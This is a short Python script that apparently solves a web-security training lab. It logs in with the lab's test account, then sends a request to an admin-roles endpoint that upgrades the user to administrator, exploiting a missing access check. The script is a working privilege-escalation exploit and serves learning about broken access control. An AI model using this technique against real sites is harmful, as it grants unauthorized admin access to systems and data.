import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def upgrade_user(session,url):
    url_login=url+"/login"
    data={"username":"wiener","password":"peter"}
    response=session.post(url_login,data=data,verify=False)
    response=response.text
    if "Log out" in response:
        print('(+) Log in successfully ')
        url_upgrade=url+"/admin-roles?username=wiener&action=upgrade"
        response_up=session.get(url_upgrade,verify=False)
        response_up=response_up.text
        if "Admin panel" in response_up:
            print('(+) User privilage Upgrade successfully')
            print("(+) Congratulations, you solved the lab!")

        else:
            print("(-) Eroor while trying to upgrade privilage ")
    else:
        print('(-) Eroor while login ')
def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'  %sys.argv[0])
        print('(+) Example %s www.example.com'%sys.argv[0] )
        sys.exit(-1)

    session=requests.session()
    url=sys.argv[1]
    upgrade_user(session,url)


if __name__ == "__main__":
    main()